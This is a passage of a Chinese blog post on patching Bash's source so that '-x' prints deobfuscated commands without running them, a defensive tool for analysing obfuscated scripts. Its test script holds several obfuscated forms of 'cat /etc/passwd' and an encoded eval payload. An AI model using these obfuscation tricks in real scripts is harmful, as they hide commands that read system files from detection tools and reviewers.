(xtrace_fp);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (xtrace_fd &gt;= <span class="number">0</span>)</div><div class="line">    close (xtrace_fd);</div><div class="line"></div><div class="line">  xtrace_fd = <span class="number">-1</span>;</div><div class="line">  xtrace_fp = <span class="built_in">stderr</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到最后的设定， <strong>xtrace</strong> 把内容输出到 <strong>stderr</strong> 中。</p>
<hr>
<p><strong>check_dev_tty()</strong> </p>
<p>顾名思义，检查设备 tty。</p>
<p><strong>set_default_locale()</strong> ：</p>
<p>设定当前 locale。</p>
<p><strong>uidget()</strong>：</p>
<p>获取当前用户的 uid/gid/euid/egid。</p>
<p><strong>set_shell_name(argv[0])</strong>：</p>
<p>用 <strong>argv[0]</strong>(即当前 Bash 的执行体文件名) 为当前 Shell 命名。</p>
<hr>
<p><strong>parse_long_options()</strong>：</p>
<p>解析 Bash 的长参数。Bash 里面的参数分<strong>长参数</strong>和<strong>普通参数</strong>，在 <code>bash --help</code> 的输出里有说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">➜ mybash --help</div><div class="line">GNU bash, version 5.0.0(1)-release-(x86_64-pc-linux-gnu)</div><div class="line">Usage:  mybash [GNU long option] [option] ...</div><div class="line">        mybash [GNU long option] [option] script-file ...</div><div class="line">GNU long options:</div><div class="line">        --debug</div><div class="line">        --debugger</div><div class="line">        --dump-po-strings</div><div class="line">        --dump-strings</div><div class="line">        --help</div><div class="line">        --init-file</div><div class="line">        --login</div><div class="line">        --noediting</div><div class="line">        --noprofile</div><div class="line">        --norc</div><div class="line">        --posix</div><div class="line">        --pretty-print</div><div class="line">        --rcfile</div><div class="line">        --restricted</div><div class="line">        --verbose</div><div class="line">        --version</div><div class="line">Shell options:</div><div class="line">        -ilrsD or -c command or -O shopt_option         (invocation only)</div><div class="line">        -abefhkmnptuvxBCHP or -o option</div><div class="line">Type `mybash -c &quot;help set&quot;&apos; for more information about shell options.</div><div class="line">Type `mybash -c help&apos; for more information about shell builtin commands.</div><div class="line">Use the `bashbug&apos; command to report bugs.</div><div class="line"></div><div class="line">bash home page: &lt;http://www.gnu.org/software/bash&gt;</div><div class="line">General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt;</div></pre></td></tr></table></figure>
<p>可以看到我的目标， <strong>-x</strong> 并不属于 <strong>长参数</strong>。</p>
<hr>
<p><strong>parse_shell_options()</strong> :</p>
<p>解析 Bash 的普通参数，普通参数的详细说明，可以用 <code>bash -c &quot;help set&quot;</code> 来打印出来，其中就包括我想要找的 <strong>-x</strong> 参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-x  Print commands and their arguments as they are executed.</div></pre></td></tr></table></figure>
<p><strong>parse_shell_options()</strong> 的实现，同样在 <strong>shell.c</strong> 中。不过翻遍函数中的 switch-case 结构，发现并没有在该函数中直接处理 <strong>-x</strong> 参数。只好去 swtich-default 语句块中找，这里调用了一个 <strong>change_flag(‘x’, ‘-‘)</strong> 函数。</p>
<p><strong>change_flag(flag, on_or_off)</strong> 函数在 <strong>flags.c</strong> 文件中定义。函数开头，调用了 <strong>flags.c::find_flag()</strong> 函数，<strong>find_flag()</strong> 函数会从一个结构体数组 <strong>shell_flags</strong> 中检索目标 flag。<strong>shell_flags</strong> 的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">struct</span> flags_alist shell_flags[] = &#123;</div><div class="line">  <span class="comment">/* Standard sh flags. */</span></div><div class="line">  &#123; <span class="string">'a'</span>, &amp;mark_modified_vars &#125;,</div><div class="line">#<span class="keyword">if</span> defined (JOB_CONTROL)</div><div class="line">  &#123; <span class="string">'b'</span>, &amp;asynchronous_notification &#125;,</div><div class="line">#endif <span class="comment">/* JOB_CONTROL */</span></div><div class="line">  &#123; <span class="string">'e'</span>, &amp;errexit_flag &#125;,</div><div class="line">  &#123; <span class="string">'f'</span>, &amp;disallow_filename_globbing &#125;,</div><div class="line">  &#123; <span class="string">'h'</span>, &amp;hashing_enabled &#125;,</div><div class="line">  &#123; <span class="string">'i'</span>, &amp;forced_interactive &#125;,</div><div class="line">  &#123; <span class="string">'k'</span>, &amp;place_keywords_in_env &#125;,</div><div class="line">#<span class="keyword">if</span> defined (JOB_CONTROL)</div><div class="line">  &#123; <span class="string">'m'</span>, &amp;jobs_m_flag &#125;,</div><div class="line">#endif <span class="comment">/* JOB_CONTROL */</span></div><div class="line">  &#123; <span class="string">'n'</span>, &amp;read_but_dont_execute &#125;,</div><div class="line">  &#123; <span class="string">'p'</span>, &amp;privileged_mode &#125;,</div><div class="line">#<span class="keyword">if</span> defined (RESTRICTED_SHELL)</div><div class="line">  &#123; <span class="string">'r'</span>, &amp;restricted &#125;,</div><div class="line">#endif <span class="comment">/* RESTRICTED_SHELL */</span></div><div class="line">  &#123; <span class="string">'t'</span>, &amp;just_one_command &#125;,</div><div class="line">  &#123; <span class="string">'u'</span>, &amp;unbound_vars_is_error &#125;,</div><div class="line">  &#123; <span class="string">'v'</span>, &amp;verbose_flag &#125;,</div><div class="line">  &#123; <span class="string">'x'</span>, &amp;echo_command_at_execute &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/* New flags that control non-standard things. */</span></div><div class="line">#<span class="keyword">if</span> <span class="number">0</span></div><div class="line">  &#123; <span class="string">'l'</span>, &amp;lexical_scoping &#125;,</div><div class="line">#endif</div><div class="line">#<span class="keyword">if</span> defined (BRACE_EXPANSION)</div><div class="line">  &#123; <span class="string">'B'</span>, &amp;brace_expansion &#125;,</div><div class="line">#endif</div><div class="line">  &#123; <span class="string">'C'</span>, &amp;noclobber &#125;,</div><div class="line">  &#123; <span class="string">'E'</span>, &amp;error_trace_mode &#125;,</div><div class="line">#<span class="keyword">if</span> defined (BANG_HISTORY)</div><div class="line">  &#123; <span class="string">'H'</span>, &amp;histexp_flag &#125;,</div><div class="line">#endif <span class="comment">/* BANG_HISTORY */</span></div><div class="line">  &#123; <span class="string">'I'</span>, &amp;no_invisible_vars &#125;,</div><div class="line">  &#123; <span class="string">'P'</span>, &amp;no_symbolic_links &#125;,</div><div class="line">  &#123; <span class="string">'T'</span>, &amp;function_trace_mode &#125;,</div><div class="line">  &#123;<span class="number">0</span>, (<span class="keyword">int</span> *)<span class="literal">NULL</span>&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>可以看到，对于 flag <strong>-x</strong> ，Bash 源码内部的标识是 <strong>echo_command_at_execute</strong> 这个变量，这个变量在 <strong>flags.c</strong> 中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Non-zero means type out the command definition after reading, but</span></div><div class="line">   before executing. */</div><div class="line"><span class="keyword">int</span> echo_command_at_execute = <span class="number">0</span>;</div></pre></td></tr></table></figure>
<p>一旦在启动 Bash 的时候，开启了 <strong>-x</strong> 选项，那么 <strong>echo_command_at_execute</strong> 的值就会被 <strong>flags.c::change_flag()</strong> 函数设定为 <strong>1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">value = find_flag (flag);</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((value == (<span class="keyword">int</span> *)FLAG_UNKNOWN) || (on_or_off != FLAG_ON &amp;&amp; on_or_off != FLAG_OFF))</div><div class="line">  <span class="keyword">return</span> (FLAG_ERROR);</div><div class="line"></div><div class="line">old_value = *value;</div><div class="line">*value = (on_or_off == FLAG_ON) ? <span class="number">1</span> : <span class="number">0</span>; <span class="comment">//#define FLAG_ON '-'</span></div></pre></td></tr></table></figure>
<p>至此，我就完成了第一个工作：找到了 <strong>-x</strong> 选项在源码中对应的标识变量。</p>
<h2 id="解析-Shell-脚本，执行-Shell-命令"><a href="#解析-Shell-脚本，执行-Shell-命令" class="headerlink" title="解析 Shell 脚本，执行 Shell 命令"></a>解析 Shell 脚本，执行 Shell 命令</h2><p>接下来，继续顺着 <strong>shell.c::main()</strong> 函数中的代码，找到解析 Shell 脚本、执行 Shell 命令的关键步骤。</p>
<p><strong>init_interactive()</strong>：</p>
<p>如果要用交互式的方式启动 Bash，这个函数就初始化交互式 Shell。</p>
<p><strong>init_noninteractive()</strong> ：</p>
<p>如果要用非交互式的方式启动 Bash，这个函数就初始化非交互式 Shell。常用的 <strong>-c</strong> 和 <strong>-x</strong> 选项就是以非交互的方式启动 Bash。</p>
<p><strong>shell_initialize()</strong> ：</p>
<p>初始化整个 Shell，从这里开始，初始完的 Shell 应该是一个可用的 Shell。</p>
<p><strong>set_default_lang()</strong> :</p>
<p>设定默认环境语言。</p>
<p><strong>set_default_locale_vars()</strong>:</p>
<p>设置默认的 locale 变量。</p>
<hr>
<p>如果是以交互式方式运行 Bash，接下来还要做一些设置。后续还要读取 Bash 的一些配置( .rc/.profile)、初始化 Bash history 等等。</p>
<p>如果要执行一个 Bash 脚本文件，还要把可能的脚本参数与脚本文件绑定(<strong>bind_args()</strong> 函数)，在这一步，读取 Shell 脚本文件名，存入变量 <strong>shell_script_filename</strong> 中。</p>
<p>如果启用 <strong>-c</strong> 选项执行一条 Bash 命令，那么调用 <strong>run_one_command()</strong> 函数来完成这个任务。</p>
<hr>
<p>最后，才是处理执行一个 Shell 脚本文件的情况。</p>
<p><strong>open_shell_script(shell_script_filename)</strong> :</p>
<p>打开 Shell 脚本文件。</p>
<p><strong>set_bash_input()</strong> ：</p>
<p>设置 Bash 的 input 环境。</p>
<p><strong>reader_loop()</strong> :</p>
<p>读取、解析、执行 Shell 脚本中的代码。<strong>reader_loop()</strong> 函数在 <strong>eval.c</strong> 文件中定义。该函数读取每一个 Shell 命令后，会调用 <strong>dispose_cmd.c::dispose_command()</strong> 函数把 Shell 命令初步解析成通用结构，Bash 中的 Command 结构在 <strong>command.h</strong> 文件中定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* What a command looks like. */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> command &#123;</div><div class="line">  <span class="keyword">enum</span> command_type type;	<span class="comment">/* FOR CASE WHILE IF CONNECTION or SIMPLE. */</span></div><div class="line">  <span class="keyword">int</span> flags;			<span class="comment">/* Flags controlling execution environment. */</span></div><div class="line">  <span class="keyword">int</span> line;			<span class="comment">/* line number the command starts on */</span></div><div class="line">  REDIRECT *redirects;		<span class="comment">/* Special redirects for FOR CASE, etc. */</span></div><div class="line">  <span class="keyword">union</span> &#123;</div><div class="line">    <span class="keyword">struct</span> for_com *For;</div><div class="line">    <span class="keyword">struct</span> case_com *Case;</div><div class="line">    <span class="keyword">struct</span> while_com *While;</div><div class="line">    <span class="keyword">struct</span> if_com *If;</div><div class="line">    <span class="keyword">struct</span> connection *Connection;</div><div class="line">    <span class="keyword">struct</span> simple_com *Simple;</div><div class="line">    <span class="keyword">struct</span> function_def *Function_def;</div><div class="line">    <span class="keyword">struct</span> group_com *Group;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (SELECT_COMMAND)</span></div><div class="line">    <span class="keyword">struct</span> select_com *Select;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (DPAREN_ARITHMETIC)</span></div><div class="line">    <span class="keyword">struct</span> arith_com *Arith;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (COND_COMMAND)</span></div><div class="line">    <span class="keyword">struct</span> cond_com *Cond;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (ARITH_FOR_COMMAND)</span></div><div class="line">    <span class="keyword">struct</span> arith_for_com *ArithFor;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">struct</span> subshell_com *Subshell;</div><div class="line">    <span class="keyword">struct</span> coproc_com *Coproc;</div><div class="line">  &#125; value;</div><div class="line">&#125; COMMAND;</div></pre></td></tr></table></figure>
<p>基于这个基础结构体，Bash 中定义了更多类型的 Command，后续将会为这些不同的 Command 执行不同的操作，具体可以阅读 <strong>command.h</strong> 中的代码。</p>
<p>最后，<strong>eval.c::reader_loop()</strong> 会把初步解析好的每一条 Shell 命令传给 <strong>execute_cmd.c::execute_command()</strong> 函数来执行。<strong>execute_cmd.c::execute_command()</strong> 函数，就是对每一条 Shell 命令解析、执行的入口。</p>
<hr>
<p><strong>execute_command()</strong> 函数实现非常简短：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line">    <span class="title">execute_command</span><span class="params">(command)</span></div><div class="line">        COMMAND *command;</div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> fd_bitmap *bitmap;</div><div class="line">  <span class="keyword">int</span> result;</div><div class="line"></div><div class="line">  current_fds_to_close = (<span class="keyword">struct</span> fd_bitmap *)<span class="literal">NULL</span>;</div><div class="line">  bitmap = new_fd_bitmap(FD_BITMAP_DEFAULT_SIZE);</div><div class="line">  begin_unwind_frame(<span class="string">"execute-command"</span>);</div><div class="line">  add_unwind_protect(dispose_fd_bitmap, (<span class="keyword">char</span> *)bitmap);</div><div class="line"></div><div class="line">  <span class="comment">/* Just do the command, but not asynchronously. */</span></div><div class="line">  result = execute_command_internal(command, <span class="number">0</span>, NO_PIPE, NO_PIPE, bitmap);</div><div class="line"></div><div class="line">  dispose_fd_bitmap(bitmap);</div><div class="line">  discard_unwind_frame(<span class="string">"execute-command"</span>);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(PROCESS_SUBSTITUTION)</span></div><div class="line">  <span class="comment">/* don't unlink fifos if we're in a shell function; wait until the function</span></div><div class="line">     returns. */</div><div class="line">  <span class="keyword">if</span> (variable_context == <span class="number">0</span> &amp;&amp; executing_list == <span class="number">0</span>)</div><div class="line">    unlink_fifo_list();</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* PROCESS_SUBSTITUTION */</span></span></div><div class="line"></div><div class="line">  QUIT;</div><div class="line">  <span class="keyword">return</span> (result);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>它的核心功能就是初始化 Shell 代码执行的环境之后，把 Command 交给 <strong>execute_cmd.c::execute_command_internal()</strong> 函数来执行。</p>
<hr>
<p><strong>execute_command_internal()</strong> 函数实现相当复杂，里面会根据 Command 的类型、动作涉及很多具体的函数调用，而且多个具体的函数调用会在一、二级调用之后再次调用 <strong>execute_command_internal()</strong> 函数。这样就形成了特别繁杂的递归调用。</p>
<p>在IDA Pro 里反编译 Bash 二进制文件，对 <strong>execute_command_internal()</strong> 的引用状况能看个大概：</p>
<p><img src="/imgs/mybash_xrefs_exec_cmd_intern.png" alt=""></p>
<p>但是 IDA 中的 xrefs 对于该函数的层级递归调用关系展示的并不完整，所以我手动整理了一个树形图，看完一目了然：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">execute_cmd.c::execute_command_internal()</div><div class="line">|----execute_in_subshell()</div><div class="line">|----|----&gt;execute_command_internal()</div><div class="line">|----execute_coproc()</div><div class="line">|----|----&gt;execute_in_subshell()</div><div class="line">|----|----|----&gt;execute_command_internal()</div><div class="line">|----time_command()</div><div class="line">|----|----&gt;execute_command_internal()</div><div class="line">|----execute_simple_command()</div><div class="line">|----|----&gt;execute_null_command()</div><div class="line">|----|----&gt;xtrace_print_word_list()</div><div class="line">|----|----&gt;builtin_address()--&gt; exec_builtin_fg_or_bg</div><div class="line">|----|----&gt;start_job()</div><div class="line">|----|----&gt;find_shell_builtin()</div><div class="line">|----|----execute_subshell_builtin_or_function()</div><div class="line">|----|----|----&gt;execute_builtin()</div><div class="line">|----|----|----execute_disk_command()</div><div class="line">|----|----|----|----&gt;search_for_command()</div><div class="line">|----|----|----|----&gt;find_function()</div><div class="line">|----|----|----|----execute_shell_function()</div><div class="line">|----|----|----|----|----execute_function()</div><div class="line">|----|----|----|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----|----|----&gt;shell_execve()</div><div class="line">|----|----|----|----|----|----&gt;execve()</div><div class="line">|----|----|----execute_function()</div><div class="line">|----|----|----|----&gt;find_function_def()</div><div class="line">|----|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----execute_builtin_or_function()</div><div class="line">|----|----|----&gt;execute_builtin()</div><div class="line">|----|----|----execute_function()</div><div class="line">|----|----|----|----&gt;find_function_def()</div><div class="line">|----|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----&gt;execute_disk_command()</div><div class="line">|----execute_for_command()</div><div class="line">|----|----&gt;print_for_command_head()</div><div class="line">|----|----&gt;xtrace_print_for_command_head()</div><div class="line">|----|----execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_arith_for_command()</div><div class="line">|----|----eval_arith_for_expr()</div><div class="line">|----|----|----&gt;xtrace_print_arith_cmd()</div><div class="line">|----|----|----&gt;expr.c::evalexp()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_select_command()</div><div class="line">|----|----&gt;xtrace_print_select_command_head()</div><div class="line">|----|----&gt;select_query()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_case_command()</div><div class="line">|----|----&gt;xtrace_print_case_command_head()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_while_command()</div><div class="line">|----|----execute_while_or_until()</div><div class="line">|----|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_until_command()</div><div class="line">|----|----execute_while_or_until()</div><div class="line">|----|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_if_command()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_command_internal()</div><div class="line">|----execute_connection()</div><div class="line">|----|----&gt;execute_command_internal()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----|----execute_pipeline()</div><div class="line">|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----|----&gt;jobs.c::wait_for()</div><div class="line">|----execute_arith_command()</div><div class="line">|----|----&gt;xtrace_print_arith_cmd()</div><div class="line">|----|----&gt;expr.c::evalexp()</div><div class="line">|----execute_cond_command()</div><div class="line">|----|----execute_cond_node()</div><div class="line">|----|----&gt;xtrace_print_cond_term()</div><div class="line">|----execute_intern_function()</div></pre></td></tr></table></figure>
<p>这样就给我最终找到真正执行 Shell 代码的位置带来了更多麻烦。</p>
<p>顺便说一下，在 <strong>execute_cmd.c</strong> 文件中，对于根据 <strong>-x</strong> 选项需要打印的 Shell 命令，都会判断一下是否设置 <strong>-x</strong> 选项，并打印 Shell 代码，形如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (echo_command_at_execute)</div><div class="line">    xtrace_print_case_command_head(case_command);</div></pre></td></tr></table></figure>
<hr>
<p>这样一来，要找到最终执行 Shell 代码的位置并打上 Patch，有两条路可走：</p>
<ol>
<li>在 <strong>execute_cmd.c</strong> 中，以 <strong>echo_command_at_execute</strong> 标识变量为线索，凡是检查这个变量并做相应 <strong>xtrace_print_XXX</strong> 的函数，均可能是最终输出不同类型 Command 的“终极函数”，在这些“终极函数”中，最终执行 Shell 命令之前给它打个 Patch，让它们只打印、不执行；</li>
<li>梳理清楚上面围绕 <strong>execute_command_internal()</strong> 函数繁杂的递归调用，找到递归逻辑的边界，即是最终执行 Shell 命令的代码。递归的逻辑特性就是这样，一直递归是有问题的，所以一定会有至少一个边界条件来跳出递归逻辑，执行递归逻辑之后最终的任务。我的目标就是找出这一堆多层递归逻辑的边界条件。这么些 <strong>execute_XXX()</strong> 函数，在结束对 <strong>execute_command_internal()</strong> 函数的多层递归调用之后，肯定要执行最终解混淆之后的 Shell 代码，我在它们执行代码之前，根据 <strong>echo_command_at_execute</strong> 标识变量打个 Patch 即可。</li>
</ol>
<p>经过一番分析，发现第 1 条路走不通。那些调用 <strong>xtrace_XXX()</strong> 函数来输出不同类型 Shell 命令的函数，并不是最终执行 Shell 命令的“终极函数”，它们还会把 Shell 命令交给其他的函数去执行。</p>
<p>所以只有第 2 条路。经过一番艰苦的梳理，确认最终执行 Shell 命令的函数为：<strong>execute_cmd.c::shell_execve()</strong> ，这个函数会对最后解混淆的 Shell 命令调用 C 语言的 <strong>execve()</strong> 函数。</p>
<h2 id="打-Patch"><a href="#打-Patch" class="headerlink" title="打 Patch"></a>打 Patch</h2><p>找到了目标之后，就简单了。我只需要在  <strong>execute_cmd.c::shell_execve()</strong> 函数中，调用 <strong>execve()</strong> 之前打个 Patch 即可：</p>
<p><img src="/imgs/mybash_patch.png" alt=""></p>
<p>是的，你没看错，上面费尽心血梳理源代码，最后只需改动这一处。</p>
<p>打完了 Patch，编译、运行，测试几段混淆过的 Shell 代码，效果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">➜ cat test.sh</div><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">#export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</div><div class="line"></div><div class="line">cat /et$&apos;c/pa\u0000/notexist/path&apos;sswd</div><div class="line"></div><div class="line">test=/ehhh/hmtc/pahhh/hmsswd;</div><div class="line">cat $&#123;test//hh??hm/&#125;;</div><div class="line"></div><div class="line">tmp_str=saudoihfnssoirtgn</div><div class="line">cat $(echo /e)tc$(echo /pa)$&#123;tmp_str:9:2&#125;wd</div><div class="line">printf &quot;\n\n&quot;</div><div class="line"></div><div class="line">#eval &quot;$(ijmduN3D=(\[ r f 5 4 G U \&quot; a i s p 1 t \% \&#125; \  e \) \/ \\ 0 b J k z 7 \] \; \&#123; \| D \( X 2 h 3 \= 9 V 8 w n \$ B c 6 d o);for s7SQJyu8 in 11 1 9 42 13 2 16 14 10 16 7 43 32 24 44 39 8 6 33 37 32 20 19 16 45 16 10 16 47 16 41 16 13 16 11 16 17 16 8 16 20 16 18 28 2 48 1 16 31 25 35 24 23 36 41 5 16 9 42 16 12 16 40 16 3 16 38 16 21 16 26 16 3 16 12 16 21 16 46 16 40 16 34 16 34 16 4 16 36 28 47 48 16 11 1 9 42 13 2 16 14 10 16 7 43 29 24 44 39 8 6 33 0 43 31 25 35 24 23 36 41 5 27 15 7 28 47 48 42 17 18 7 30 22 8 10 35;do printf %s &quot;$&#123;ijmduN3D[$s7SQJyu8]&#125;&quot;;done)&quot;</div><div class="line">➜</div><div class="line">➜ mybash -x test.sh</div><div class="line">+ cat /etc/passwd</div><div class="line">+ test=/ehhh/hmtc/pahhh/hmsswd</div><div class="line">+ cat /etc/passwd</div><div class="line">+ tmp_str=saudoihfnssoirtgn</div><div class="line">++ echo /e</div><div class="line">++ echo /pa</div><div class="line">+ cat /etc/passwd</div><div class="line">+ printf &apos;\n\n&apos;</div></pre></td></tr></table></figure>
<p>当然，这个 Patch 还不完美，因为没有处理重定向和管道，所以对个别情况解析不完美。有更好思路的朋友欢迎留言指教。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;缘由&quot;&gt;&lt;a href=&quot;#缘由&quot; class=&quot;headerlink&quot; title=&quot;缘由&quot;&gt;&lt;/a&gt;缘由&lt;/h2&gt;&lt;p&gt;攻防对抗中，JavaScript 和 Powershell 脚本的混淆见得很多，但经过混淆的 Shell 脚本见得相对少一些。其实，Shell 作为一种简易而灵活的编程语言，其脚本也完全可以做到像 JS/Powershell 那样的混淆。混淆一般是为了逃过自动化检测，也可以给人工分析增加难度。比如，针对 &lt;code&gt;cat /etc/passwd&lt;/code&gt; 这一条命令就可以用下面 3 种轻度混淆的方式来编写：&lt;/p&gt;
